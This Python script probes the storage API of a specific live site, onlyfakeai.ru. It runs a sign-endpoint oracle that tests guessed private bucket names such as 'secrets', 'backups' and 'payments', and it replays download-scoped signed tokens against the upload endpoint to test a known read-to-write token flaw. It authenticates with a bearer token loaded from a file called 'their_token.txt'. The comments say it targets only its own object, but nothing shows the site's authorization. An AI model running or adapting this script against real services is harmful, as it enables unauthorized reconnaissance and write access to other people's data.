#!/usr/bin/env python3
# Storage scope-replay (GHSA read-token->write) on OUR OWN object + private-bucket sign oracle.
import json, sys, time, urllib.request, urllib.error, urllib.parse
sys.stdout.reconfigure(encoding="utf-8")
BASE = "https://cdn.onlyfakeai.ru"
PK = "<publishable-key>"
TA = json.load(open("their_token.txt"))["access_token"]
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
H = {"User-Agent": UA, "Accept": "application/json", "Origin": "https://onlyfakeai.ru",
     "Referer": "https://onlyfakeai.ru/", "apikey": PK}
P = "supa-angle-scope-probe.txt"

def call(method, path, body=None, token=None, raw=None, extra=None, read=1200):
    h = dict(H)
    if token: h["Authorization"] = "Bearer " + token
    if extra: h.update(extra)
    data = raw if raw is not None else (json.dumps(body).encode() if body is not None else None)
    if data is not None and not extra: h["Content-Type"] = "application/json"
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            return resp.status, resp.read(read).decode("utf-8", "replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(read).decode("utf-8", "replace"), dict(e.headers)
    except Exception as e:
        return "ERR", repr(e), {}

print("== private-bucket existence oracle via sign endpoint ==")
priv = ["templates", "site-assets", "generated", "static", "documents", "private", "no-watermark", "backups",
        "exports", "avatars", "uploads", "media", "assets", "admin", "config", "secrets", "invoices", "payments",
        "reports", "archive", "temp", "files", "images", "documents-private", "user-documents", "llm", "logs"]
for b in priv:
    st, body, _ = call("POST", f"/storage/v1/object/sign/{urllib.parse.quote(b)}/zz-nonexistent-probe.bin", body={"expiresIn": 60}, read=400)
    kind = "BUCKET_EXISTS" if ("NoSuchKey" in body or "Object not found" in body) else ("missing" if "NoSuchBucket" in body else f"?{st}")
    if kind != "missing":
        print(f"[SIGN] {kind} bucket={b} status={st} {body[:180]}")
    time.sleep(0.25)

print("\n== create our own object in backgrounds via signed upload (auth) ==")
st, body, _ = call("POST", f"/storage/v1/object/upload/sign/backgrounds/{P}", body={}, token=TA)
print("mint upload url:", st, body[:300])
try:
    upath = json.loads(body)["url"]
    utoken = upath.split("token=")[1]
except Exception:
    upath = utoken = None
if upath:
    st, body, _ = call("PUT", upath, raw=b"scope-probe-original", extra={"Content-Type": "text/plain"}, read=400)
    print("upload PUT:", st, body[:300])
    time.sleep(0.8)
    # mint download URL for our own object (anon, public bucket)
    st, body, _ = call("POST", f"/storage/v1/object/sign/backgrounds/{P}", body={"expiresIn": 180})
    print("mint download url:", st, body[:400])
    dl = json.loads(body)["signedURL"] if st == 200 else None
    dtok = dl.split("token=")[1] if dl else None
    print("download-scoped token payload:", dtok.split(".")[1] if dtok else None)
    if dtok:
        # (a) token must work for download
        st, body, _ = call("GET", dl, read=300)
        print("GET with download token:", st, body[:120])
        # (b) replay download token to upload endpoint (old GHSA class)
        st, body, _ = call("PUT", f"/storage/v1/object/upload/sign/backgrounds/{P}?token={dtok}",
                           raw=b"replayed-write", extra={"Content-Type": "text/plain"}, read=400)
        print("REPLAY download->upload:", st, body[:300])
        # (c) verify object content unchanged / not replays
        st, body, _ = call("GET", dl, read=300)
        print("after replay GET:", st, body[:200])
    # attempt upload-token reuse on download endpoint
    if utoken:
        st, body, _ = call("GET", f"/storage/v1/object/sign/backgrounds/{P}?token={utoken}", read=300)
        print("upload token -> download endpoint:", st, body[:300])
    # cleanup our own object (owner delete)
    st, body, _ = call("DELETE", f"/storage/v1/object/backgrounds/{P}", token=TA, read=400)
    print("cleanup delete:", st, body[:300])
print("\ndone")
